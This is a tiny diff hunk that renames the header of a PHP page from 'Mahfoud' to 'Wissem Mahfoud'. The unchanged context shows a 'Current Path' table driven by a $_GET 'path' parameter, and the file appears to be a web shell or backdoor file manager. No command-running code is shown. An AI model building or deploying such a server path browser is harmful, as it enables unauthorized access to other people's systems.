@@ -65,7 +65,7 @@ border-radius:5px;
 </style>
 </HEAD>
 <BODY>
-<H1><center>Mahfoud</center></H1>
+<H1><center>Wissem Mahfoud</center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>Current Path : ';
 if(isset($_GET['path'])){
